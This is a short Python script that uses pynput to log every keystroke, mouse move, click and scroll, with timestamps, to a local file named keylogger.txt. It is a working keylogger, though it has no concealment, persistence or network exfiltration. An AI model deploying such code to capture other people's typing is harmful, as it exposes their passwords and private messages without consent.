import datetime
import pynput
from datetime import datetime
from pynput import mouse, keyboard

#Defining the timestamp of the action
def timenow():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]

#Mouse movement, clicks, and cursor movement
last_x = 0
last_y = 0

def on_move(x, y, injected):
    global last_x, last_y  # This now has a variable to "link" to
    distance = abs(x - last_x) + abs(y - last_y)

    if distance > 25:
        last_x, last_y = x, y
        log_entry = f"[{timenow()}] Pointer moved to {x, y}. Injected: {injected}\n"
        logfile.write(log_entry)

def on_click(x, y, button, pressed, injected):
    inj_status = 'faked' if injected else 'not faked'
    pr_status = 'pressed' if pressed else 'released'
    log_entry = f"[{timenow()} Clicked at {x,y}. Pressed?: {pr_status}. Injected: {inj_status}]\n"
    logfile.write(log_entry)

def on_scroll(x, y, dx, dy, injected):
    inj_status = 'faked' if injected else 'not faked'
    scr_status = 'down' if dy < 0 else 'up'
    log_entry = f"[{timenow()} Scrolled at {x,y}. Up/down: {scr_status}. Injected: {inj_status}]\n"
    logfile.write(log_entry)

#Keyboard logging
def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    log_entry = f"[{timenow()} {k} was pressed.]\n"
    logfile.write(log_entry)

def on_release(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    log_entry= f"[{timenow()} {k} was released.]\n"
    logfile.write(log_entry)

#Start the stream
with open("keylogger.txt", "a") as logfile:
    print("Loading mouse activity")
    m_listener = mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)
    k_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    k_listener.start()
    m_listener.start()
    m_listener.join()
    k_listener.join()


